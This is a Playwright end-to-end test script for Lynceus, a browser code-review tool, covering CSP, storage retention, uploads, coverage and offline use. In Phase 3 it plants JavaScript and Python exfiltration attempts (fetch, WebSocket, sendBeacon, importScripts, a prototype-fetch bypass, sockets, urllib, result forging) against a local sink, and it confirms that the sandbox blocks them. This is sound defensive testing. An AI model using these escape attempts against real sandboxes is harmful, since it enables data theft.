// Lynceus end-to-end checks (Phases 1-3) against the production build.
// Usage: npm run build && npm run e2e      (needs Playwright + Chromium installed)
import { createRequire } from 'module';
import http from 'http';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
const require = createRequire(import.meta.url);
const { chromium } = require('playwright');
const { zipSync, strToU8 } = require('fflate');

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../dist');
const PORT = 4173, APP = `http://127.0.0.1:${PORT}/`;
const CANARY = 'LYNCEUS_E2E_CANARY_7731';
const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.mjs': 'text/javascript', '.wasm': 'application/wasm', '.json': 'application/json', '.zip': 'application/zip', '.css': 'text/css', '.svg': 'image/svg+xml', '.webmanifest': 'application/manifest+json' };

function serve() {
  const s = http.createServer((req, res) => {
    let p = decodeURIComponent(new URL(req.url, APP).pathname);
    if (p.endsWith('/')) p += 'index.html';
    const f = path.join(ROOT, p);
    if (!f.startsWith(ROOT) || !fs.existsSync(f)) { res.writeHead(404); return res.end('not found'); }
    res.writeHead(200, { 'Content-Type': TYPES[path.extname(f)] || 'application/octet-stream' });
    fs.createReadStream(f).pipe(res);
  });
  return new Promise((r) => s.listen(PORT, '127.0.0.1', () => r(s)));
}

// A "sink" on another origin: any connection reaching it means user code got data out.
const SINK_PORT = 4174, SINK = `http://127.0.0.1:${SINK_PORT}/`;
let sinkHits = 0;
const sink = http.createServer((req, res) => { res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok'); });
sink.on('connection', () => { sinkHits++; });
await new Promise((r) => sink.listen(SINK_PORT, '127.0.0.1', r));

const results = [];
const check = (name, pass, detail = '') => { results.push({ name, pass, detail }); console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail && !pass ? '  -> ' + detail : ''}`); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
// Playwright's fill() is very slow for 30k-line strings; set the value and fire 'input' like a paste would.
const bigFill = (page, sel, text) => page.evaluate(([s, t]) => { const el = document.querySelector(s); el.value = t; el.dispatchEvent(new Event('input', { bubbles: true })); }, [sel, text]);

if (!fs.existsSync(path.join(ROOT, 'index.html'))) { console.error('Run `npm run build` first.'); process.exit(2); }
let server = await serve();
const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1000, height: 800 } });
const requests = [];
ctx.on('request', (r) => requests.push(r.url()));
try {
  const cspViolations = [];
  const pageErrors = [];
  const watch = (p) => {
    p.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) cspViolations.push(m.text()); });
    p.on('pageerror', (e) => pageErrors.push(e.message));
    p.on('worker', (w) => w.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) cspViolations.push('worker: ' + m.text()); }));
  };
  ctx.on('page', watch);
  let page = await ctx.newPage();
  await page.goto(APP);

  // ---- CSP present + no violations on load
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  check('CSP meta in built page (connect-src self)', !!csp && csp.includes("connect-src 'self'"), csp);

  // ---- theme: default light, toggle persists
  check('default theme is light', (await page.evaluate(() => document.documentElement.dataset.theme)) === 'light');
  await page.getByRole('button', { name: /switch to dark mode/i }).click();
  await page.reload();
  check('dark theme persists after reload', (await page.evaluate(() => document.documentElement.dataset.theme)) === 'dark');
  await page.getByRole('button', { name: /switch to light mode/i }).click();

  // ---- paste + auto-detect + load
  await page.locator('#paste').fill(`import os\n\ndef secret():\n    # ${CANARY}\n    if os.environ:\n        return None\n`);
  check('language auto-detect shows Python, tagged heuristic', /Python/.test(await page.getByTestId('guess').innerText()) && /heuristic/.test(await page.getByTestId('guess').innerText()));
  await page.getByRole('button', { name: 'Review this code' }).click();
  check('paste loads 1 Python file', /pasted\.py/.test(await page.getByTestId('loaded').innerText()));

  // ---- acceptance #9: close + reopen tab with retention OFF shows no code, storage holds no code
  await page.close();
  page = await ctx.newPage();
  await page.goto(APP);
  await sleep(300);
  const leftover = await page.evaluate(async (c) => {
    const html = document.body.innerText.includes(c) || document.querySelector('#paste').value.includes(c);
    const ls = JSON.stringify({ ...localStorage }).includes(c);
    const ss = JSON.stringify({ ...sessionStorage }).includes(c);
    const dbs = (await indexedDB.databases()).map((d) => d.name);
    let cached = false;
    for (const k of await caches.keys()) for (const req of await (await caches.open(k)).keys()) {
      const body = await (await (await caches.open(k)).match(req)).text().catch(() => '');
      if (body.includes(c)) cached = true;
    }
    return { html, ls, ss, dbs, cached };
  }, CANARY);
  check('#9 reopened tab shows no previous code (retention off)', !leftover.html && !leftover.ls && !leftover.ss && !leftover.cached && !leftover.dbs.includes('lynceus-session'), JSON.stringify(leftover));
  check('no "Loaded" panel after reopen', (await page.getByTestId('loaded').count()) === 0);

  // ---- zip upload keeps folders, reports skipped
  const zip = zipSync({
    'proj/pkg/calc.py': strToU8('def add(a, b):\n    return a + b\n'),
    'proj/tests/test_calc.py': strToU8('from pkg.calc import add\n\ndef test_add():\n    assert add(1, 2) == 3\n'),
    'proj/notes.txt': strToU8('hello'),
  });
  await page.getByTestId('file-input').setInputFiles({ name: 'proj.zip', mimeType: 'application/zip', buffer: Buffer.from(zip) });
  await page.getByTestId('pending').waitFor();
  const pend = await page.getByTestId('pending').innerText();
  check('zip upload keeps folder paths', pend.includes('pkg/calc.py') && pend.includes('tests/test_calc.py') && /test/.test(pend), pend);
  check('zip upload lists skipped file with reason', /notes\.txt[\s\S]*not a Python or JavaScript/.test(await page.getByTestId('skipped').innerText()));

  // ---- multi-file upload
  await page.getByTestId('file-input').setInputFiles([
    { name: 'util.js', mimeType: 'text/javascript', buffer: Buffer.from('module.exports = { x: 1 };\n') },
    { name: 'util.test.js', mimeType: 'text/javascript', buffer: Buffer.from("test('x', () => {});\n") },
  ]);
  await sleep(200);
  const pend2 = await page.getByTestId('pending').innerText();
  check('multi-file upload adds JS files', pend2.includes('util.js') && pend2.includes('util.test.js'), pend2);

  // ---- size limits
  await bigFill(page, '#paste', 'x = 1\n'.repeat(5200));
  check('warns above 5,000 lines', /Large input/.test(await page.getByTestId('limits').innerText()));
  await bigFill(page, '#paste', 'x = 1\n'.repeat(30100));
  const lim = await page.getByTestId('limits').innerText();
  check('hard stop above 30,000 lines (button disabled)', /Too much code/.test(lim) && await page.getByRole('button', { name: 'Review this code' }).isDisabled(), lim);
  await bigFill(page, '#paste', '');

  // ---- remember ON: survives reopen, indicator shown; Clear everything wipes it
  await page.locator('#paste').fill(`def f():\n    return "${CANARY}"\n`);
  await page.getByTestId('remember').check();
  await page.getByRole('button', { name: 'Review this code' }).click();
  await sleep(300);
  await page.close();
  page = await ctx.newPage();
  await page.goto(APP);
  await page.getByTestId('loaded').waitFor({ timeout: 5000 }).catch(() => {});
  check('remember ON: session restored after reopen', (await page.getByTestId('loaded').count()) === 1);
  check('remember ON: "Remembering" indicator visible', await page.getByText('● Remembering').isVisible());
  await page.getByRole('button', { name: 'Clear everything' }).click();
  await sleep(300);
  const afterClear = await page.evaluate(async (c) => ({
    dbs: (await indexedDB.databases()).map((d) => d.name),
    remember: JSON.parse(localStorage.getItem('lynceus.settings') || '{}').remember,
    body: document.body.innerText.includes(c),
  }), CANARY);
  check('Clear everything wipes IndexedDB and turns Remember off', !afterClear.dbs.includes('lynceus-session') && afterClear.remember === false && !afterClear.body, JSON.stringify(afterClear));
  await page.reload();
  check('after Clear + reload: nothing restored', (await page.getByTestId('loaded').count()) === 0);


  // ================= Phase 2: analysis, code view, evidence, drag-and-drop =================
  const JS_SRC = "function classify(n) {\n  if (n < 0) {\n    return 'negative';\n  }\n  let total = 0;\n  for (let i = 0; i < n; i++) {\n    if (i % 2) {\n      if (i > 2) {\n        if (i > 4) {\n          console.log(i);\n        }\n      }\n    }\n  }\n  save(total);\n  return total;\n}\nmodule.exports = { classify };\n";
  const PY_SRC = "import random\n\ndef pick(xs):\n    total = 0\n    for x in xs:\n        if x % 2:\n            total += x\n    xs.append(random.random())\n    return total\n";
  await page.getByRole('button', { name: 'Clear everything' }).click();
  // drag-and-drop onto the page (synthetic DataTransfer: no folder entries, so the plain-files path is used)
  await page.evaluate(([name, text]) => {
    const dt = new DataTransfer();
    dt.items.add(new File([text], name, { type: 'text/javascript' }));
    const sec = document.querySelector('section[aria-labelledby="input-h"]');
    sec.dispatchEvent(new DragEvent('dragenter', { bubbles: true, cancelable: true, dataTransfer: dt }));
    sec.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: dt }));
  }, ['dropped/classify.js', JS_SRC]);
  await page.getByTestId('pending').waitFor({ timeout: 5000 }).catch(() => {});
  check('drag-and-drop a file onto the page adds it', (await page.getByTestId('pending').count()) === 1 && /classify\.js/.test(await page.getByTestId('pending').innerText()));
  // drop one file on the paste box -> its text lands in the box
  await page.evaluate((text) => {
    const dt = new DataTransfer();
    dt.items.add(new File([text], 'pick.py', { type: 'text/x-python' }));
    const ta = document.querySelector('#paste');
    ta.dispatchEvent(new DragEvent('dragenter', { bubbles: true, cancelable: true, dataTransfer: dt }));
    ta.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: dt }));
  }, PY_SRC);
  await sleep(300);
  check('dropping one file on the paste box fills the box', (await page.locator('#paste').inputValue()).includes('def pick') && (await page.locator('input[type=text]').first().inputValue()) === 'pick.py');
  // JS only first: remove the pasted Python so no consent is needed yet
  await bigFill(page, '#paste', '');
  await page.getByRole('button', { name: 'Review this code' }).click();
  await page.locator('nav.inline').getByRole('button', { name: 'Code' }).click();
  await page.locator('[data-line="10"]').waitFor({ timeout: 15000 });
  const row10 = page.locator('[data-line="10"]');
  check('JS: console.log line gets gutter letter I', (await row10.locator('.letter').innerText()).trim() === 'I');
  check('JS: unknown call save() gets U (never pure)', (await page.locator('[data-line="15"] .letter').innerText()).trim() === 'U');
  check('calm by default: no role tint until a chip is pressed', !(await page.locator('.code').getAttribute('class')).includes('show-'));
  await page.locator('.chip.r-io').click();
  check('role chip turns on the tint for that role', (await page.locator('.code').getAttribute('class')).includes('show-io'));
  await row10.click();
  const pane = await page.locator('.right-pane').innerText();
  check('tap a line: evidence pane shows rule, detail and certainty', /call\.io/.test(pane) && /console\.log\(\) matches I\/O rule/.test(pane) && /certain/.test(pane), pane.slice(0, 300));
  check('deep nesting flagged (level 4 > limit 3)', (await page.locator('[data-line="9"] .flag').innerText()).includes('⚑'));
  await page.locator('[data-line="6"] .fold-btn').click();
  const summary = await page.locator('.summary').first().innerText();
  check('collapse shows syntax-tree summary', /for loop · \d+ branches · calls console\.log\(\)/.test(summary), summary);
  check('collapsed lines are hidden', (await page.locator('[data-line="10"]').count()) === 0);
  await page.keyboard.press('Escape');
  check('Escape clears the selection (pane shows How to read this)', /How to read this/.test(await page.locator('.right-pane').innerText()));
  // Python: consent first, then analysis in Pyodide
  await page.locator('nav.inline').getByRole('button', { name: 'Input' }).click();
  await page.locator('#paste').fill(PY_SRC);
  await page.getByRole('button', { name: 'Review this code' }).click();
  await page.locator('nav.inline').getByRole('button', { name: 'Code' }).click();
  await page.getByRole('button', { name: 'Download Python support' }).waitFor({ timeout: 10000 });
  check('Python asks before the one-time download, showing the size', /\d+\.\d MB/.test(await page.locator('.consent').innerText()));
  await page.getByRole('button', { name: 'Download Python support' }).click();
  await page.getByTestId('file-select').waitFor({ timeout: 60000 });
  await page.selectOption('[data-testid=file-select]', 'pick.py');
  await page.locator('[data-line="8"]').waitFor();
  check('Python: xs.append() is heuristic mutation... but random.random() makes it I/O', (await page.locator('[data-line="8"] .letter').innerText()).trim() === 'I');
  await page.locator('[data-line="7"]').click();
  check('Python: local += is pure, from the syntax tree', /assign\.local/.test(await page.locator('.right-pane').innerText()));
  const pyCached = await page.evaluate(async () => (await caches.keys()).some((k) => k.startsWith('lynceus-pyodide-')));
  check('Pyodide stored by the service worker after first use', pyCached);


  // ================= Phase 3: sandbox, test runner, per-test coverage =================
  const file = (name, text) => ({ name, mimeType: 'text/plain', buffer: Buffer.from(text) });
  async function runProject(files, { width = 1000, timeout } = {}) {
    const p = await ctx.newPage();
    if (width !== 1000) await p.setViewportSize({ width, height: 800 });
    await p.goto(APP);
    await p.getByTestId('file-input').setInputFiles(files);
    await p.getByRole('button', { name: 'Review this code' }).click();
    const nav = width >= 760 ? p.locator('nav.inline') : p.locator('nav.tabbar:not(.inline)');
    await nav.getByRole('button', { name: 'Tests' }).click();
    if (timeout) { await p.locator('.limits summary').click(); await p.getByTestId('test-timeout').fill(String(timeout)); await p.getByTestId('test-timeout').dispatchEvent('change'); }
    await p.getByRole('button', { name: /^Run tests/ }).click();
    await p.getByTestId('test-summary').waitFor({ timeout: 120000 });
    const res = {};
    for (const li of await p.getByTestId('result').all()) res[(await li.locator('.name').innerText()).trim()] = { outcome: await li.getAttribute('data-outcome'), text: await li.innerText() };
    return { p, res, nav };
  }
  const JS_CALC = "export function sign(n) {\n  if (n < 0) {\n    return -1;\n  }\n  return 1;\n}\nexport const twice = (x) => x * 2;\n";
  const JS_TEST = "import { sign, twice } from './calc.js';\ndescribe('calc', () => {\n  test('sign of 5', () => { expect(sign(5)).toBe(1); });\n  test('twice is wrong', () => { expect(twice(2)).toBe(5); });\n  test('reads a file', () => { require('fs').readFileSync('x'); });\n});\n";
  {
    const { p, res, nav } = await runProject([file('src/calc.js', JS_CALC), file('src/calc.test.js', JS_TEST)]);
    check('JS tests: pass reported', res['calc › sign of 5']?.outcome === 'passed', JSON.stringify(res));
    check('JS tests: failure shows the assertion message', res['calc › twice is wrong']?.outcome === 'failed' && /Expected: 5[\s\S]*Received: 4/.test(res['calc › twice is wrong'].text));
    check('JS tests: Node built-in fails that one test with a clear reason', res['calc › reads a file']?.outcome === 'error' && /Node built-in "fs" isn't available/.test(res['calc › reads a file'].text));
    await p.getByRole('button', { name: 'src/calc.js', exact: true }).first().click();
    await p.locator('[data-line="3"]').waitFor();
    check('coverage: untested line is dimmed and labelled "not run by the provided tests"', (await p.locator('[data-line="3"]').getAttribute('class')).includes('cov-miss') && (await p.locator('[data-line="3"] .nr-tag').innerText()).includes('not run by the provided tests'));
    check('coverage: never calls untested code "dead"', !/\bdead\b/i.test(await p.locator('.code').innerText()));
    await p.locator('[data-line="5"]').click();
    check('tap a covered line: lists the tests that ran it', /Run by 1 test[\s\S]*calc › sign of 5/.test(await p.getByTestId('line-tests').first().innerText()));
    await p.getByTestId('coverage-toggle').click();
    check('coverage layer can be switched off', (await p.locator('.cov-miss').count()) === 0);
    await p.close();
  }
  const PY_CALC = "def sign(n):\n    if n < 0:\n        return -1\n    return 1\n";
  const PY_TEST = "from calc import sign\n\ndef test_positive():\n    assert sign(5) == 1\n\ndef test_wrong():\n    assert sign(2) == 7\n";
  {
    const { p, res } = await runProject([file('calc.py', PY_CALC), file('test_calc.py', PY_TEST)]);
    check('Python tests: pytest pass and fail with assertion text', res['test_positive']?.outcome === 'passed' && res['test_wrong']?.outcome === 'failed' && /assert 1 == 7/.test(res['test_wrong'].text), JSON.stringify(res).slice(0, 400));
    await p.getByRole('button', { name: 'calc.py', exact: true }).first().click();
    await p.locator('[data-line="3"]').waitFor();
    check('Python coverage: untested return is dimmed and labelled', (await p.locator('[data-line="3"]').getAttribute('class')).includes('cov-miss'));
    await p.locator('[data-line="4"]').click();
    check('Python coverage: line shows the exact tests that ran it', /Run by 2 tests/.test(await p.getByTestId('line-tests').first().innerText()));
    await p.close();
  }
  {
    const before = sinkHits;
    const EXFIL_JS = [
      `test('fetch', async () => { await fetch('${SINK}a'); });`,
      `test('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', '${SINK}b'); x.send(); });`,
      `test('websocket', () => { new WebSocket('ws://127.0.0.1:${SINK_PORT}/'); });`,
      `test('eventsource', () => { new EventSource('${SINK}c'); });`,
      `test('beacon', () => { navigator.sendBeacon('${SINK}d', 'x'); });`,
      `test('nested worker', () => { new Worker('${SINK}e.js'); });`,
      `test('importScripts', () => { importScripts('${SINK}f.js'); });`,
      `test('prototype fetch', async () => { const f = Object.getPrototypeOf(Object.getPrototypeOf(self)).fetch; await f.call(self, '${SINK}g'); });`,
      `test('fake result via postMessage', () => { self.postMessage({ type: 'result', result: { id: 'x', outcome: 'passed' } }); });`,
    ].join('\n');
    const { p, res } = await runProject([file('exfil.test.js', EXFIL_JS)]);
    const names = ['fetch', 'xhr', 'websocket', 'eventsource', 'beacon', 'nested worker', 'importScripts', 'prototype fetch'];
    const bad = names.filter((n) => !(res[n] && res[n].outcome === 'failed' && /network blocked by Lynceus/.test(res[n].text)));
    check('planted JS exfiltration tests all fail loudly ("network blocked by Lynceus")', bad.length === 0, bad.map((n) => `${n}: ${JSON.stringify(res[n])}`).join(' | '));
    check('JS user code cannot post fake results to the page', res['fake result via postMessage']?.outcome === 'failed' && /reserved by Lynceus/.test(res['fake result via postMessage'].text));
    await p.close();
    const EXFIL_PY = [
      'import pytest', '',
      'def test_js():\n    import js\n    js.fetch("' + SINK + 'h")\n',
      'def test_pyodide_http():\n    from pyodide.http import pyfetch\n',
      'def test_micropip():\n    import micropip\n',
      'def test_socket():\n    import socket\n    socket.create_connection(("127.0.0.1", ' + SINK_PORT + '))\n',
      'def test_urllib():\n    import urllib.request\n    urllib.request.urlopen("' + SINK + 'i")\n',
      'def test_http_client():\n    import http.client\n    c = http.client.HTTPConnection("127.0.0.1", ' + SINK_PORT + ')\n    c.request("GET", "/j")\n',
    ].join('\n');
    const r2 = await runProject([file('test_exfil.py', EXFIL_PY)]);
    const pyBad = ['test_js', 'test_pyodide_http', 'test_micropip', 'test_socket', 'test_urllib', 'test_http_client'].filter((n) => !(r2.res[n] && r2.res[n].outcome === 'failed' && /network blocked by Lynceus/.test(r2.res[n].text)));
    check('planted Python exfiltration tests all fail loudly', pyBad.length === 0, pyBad.map((n) => `${n}: ${JSON.stringify(r2.res[n])?.slice(0, 200)}`).join(' | '));
    await r2.p.close();
    check('zero connections reached the sink during exfiltration tests', sinkHits === before, `${sinkHits - before} hits`);
  }
  {
    const { p, res } = await runProject([file('loop.test.js', "test('spins forever', () => { while (true) {} });\ntest('runs after', () => { expect(1 + 1).toBe(2); });\n")], { timeout: 2 });
    check('JS infinite loop: stopped at the limit and reported by name', res['spins forever']?.outcome === 'timeout' && /Stopped after 2 s/.test(res['spins forever'].text), JSON.stringify(res));
    check('JS: the other tests still ran in a fresh sandbox', res['runs after']?.outcome === 'passed');
    await p.close();
    const r2 = await runProject([file('test_loop.py', "def test_spins():\n    while True:\n        pass\n\ndef test_ok():\n    assert True\n")], { timeout: 3 });
    check('Python infinite loop: stopped and reported by name; others still ran', r2.res['test_spins']?.outcome === 'timeout' && r2.res['test_ok']?.outcome === 'passed', JSON.stringify(r2.res));
    await r2.p.close();
    // restore the default limit for later checks
    const p3 = await ctx.newPage(); await p3.goto(APP); await p3.evaluate(() => { const s = JSON.parse(localStorage.getItem('lynceus.settings')); s.testTimeoutSec = 10; localStorage.setItem('lynceus.settings', JSON.stringify(s)); }); await p3.close();
  }
  {
    const p = await ctx.newPage();
    await p.goto(APP);
    await p.locator('#paste').fill(JS_SRC);
    await p.getByRole('button', { name: 'Review this code' }).click();
    await p.locator('nav.inline').getByRole('button', { name: 'Tests' }).click();
    check('no tests: says so plainly and turns coverage off', /No tests found/.test(await p.getByTestId('no-tests').innerText()));
    await p.close();
  }
  {
    const { p } = await runProject([file('src/calc.js', JS_CALC), file('src/calc.test.js', JS_TEST)], { width: 360 });
    const over = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    check('phone: Tests tab with results has no horizontal scroll', over <= 0, `${over}px`);
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', 'phone-tests.png'), fullPage: true });
    await p.close();
  }

  // phone: bottom sheet
  {
    const p = await ctx.newPage();
    await p.setViewportSize({ width: 360, height: 740 });
    await p.goto(APP);
    await p.locator('#paste').fill(JS_SRC);
    await p.getByRole('button', { name: 'Review this code' }).click();
    await p.locator('nav.tabbar:not(.inline)').getByRole('button', { name: 'Code' }).click();
    await p.locator('[data-line="10"]').click();
    check('phone: tapping a line opens the bottom sheet with evidence', await p.locator('.sheet').isVisible() && /call\.io/.test(await p.locator('.sheet').innerText()));
    const over = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    check('phone: Code tab has no page-level horizontal scroll', over <= 0, `${over}px`);
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', 'phone-code.png') });
    await p.close();
  }

  // ---- phone width, both themes: no horizontal scroll
  for (const theme of ['light', 'dark']) {
    const p = await ctx.newPage();
    await p.setViewportSize({ width: 360, height: 740 });
    await p.goto(APP);
    await p.evaluate((t) => (document.documentElement.dataset.theme = t), theme);
    const overflow = [];
    for (const tab of ['Input', 'Queue', 'Code', 'Tests', 'Report']) {
      await p.locator('nav.tabbar:not(.inline)').getByRole('button', { name: tab }).click();
      const over = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
      if (over > 0) overflow.push(`${tab}: ${over}px`);
    }
    await p.locator('nav.tabbar:not(.inline)').getByRole('button', { name: 'Input' }).click();
    check(`no horizontal scroll at 360px on every tab (${theme})`, overflow.length === 0, overflow.join(', '));
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', `phone-${theme}.png`), fullPage: true });
    await p.close();
  }

  // ---- offline after first load
  await page.evaluate(() => navigator.serviceWorker.ready);
  await page.reload(); // make sure the page is controlled
  await page.waitForFunction(() => !!navigator.serviceWorker.controller, null, { timeout: 15000 });
  await new Promise((r) => server.close(r));
  await ctx.setOffline(true);
  await page.reload();
  check('works offline after first load (server stopped + offline)', await page.getByRole('heading', { name: 'Review some code' }).isVisible());
  // Python offline, using the Pyodide copy the service worker stored earlier
  await page.locator('#paste').fill(PY_SRC);
  await page.getByRole('button', { name: 'Review this code' }).click();
  await page.locator('nav.inline').getByRole('button', { name: 'Code' }).click();
  await page.getByTestId('file-select').waitFor({ timeout: 60000 }).catch(() => {});
  check('Python analysis works offline (no consent prompt the second time)', (await page.getByRole('button', { name: 'Download Python support' }).count()) === 0 && (await page.locator('[data-line="8"] .letter').count()) === 1);
  // Python TESTS offline too (Pyodide + wheels from the service-worker cache)
  {
    const p = await ctx.newPage();
    await p.goto(APP);
    await p.getByTestId('file-input').setInputFiles([file('calc.py', PY_CALC), file('test_calc.py', PY_TEST)]);
    await p.getByRole('button', { name: 'Review this code' }).click();
    await p.locator('nav.inline').getByRole('button', { name: 'Tests' }).click();
    await p.getByRole('button', { name: /^Run tests/ }).click();
    await p.getByTestId('test-summary').waitFor({ timeout: 120000 }).catch(() => {});
    const txt = await p.locator('main').innerText();
    check('Python tests run offline after first use', /1 passed/.test(txt) && /1 failed/.test(txt), txt.slice(0, 300));
    await p.close();
  }
  await ctx.setOffline(false);

  check('no CSP violations (pages and workers)', cspViolations.length === 0, cspViolations.join(' | '));
  check('no uncaught page errors', pageErrors.length === 0, pageErrors.join(' | '));
  const foreign = requests.filter((u) => !u.startsWith(APP) && !u.startsWith('blob:') && !u.startsWith('data:'));
  check('zero requests to any other origin', foreign.length === 0, foreign.join(', '));
} catch (e) {
  check('e2e run completed', false, String(e && e.stack || e).slice(0, 600));
  for (const pg of ctx.pages()) { try { console.log('PAGE TEXT:', (await pg.locator('main').innerText()).slice(0, 700)); } catch {} }
} finally {
  await browser.close();
  server.close?.();
  sink.close();
}
const failed = results.filter((r) => !r.pass);
console.log(`\n${results.length - failed.length}/${results.length} passed`);
fs.writeFileSync(path.join(ROOT, '..', 'tests', 'e2e', 'last-run.json'), JSON.stringify({ at: new Date().toISOString(), results }, null, 2));
process.exit(failed.length ? 1 : 0);
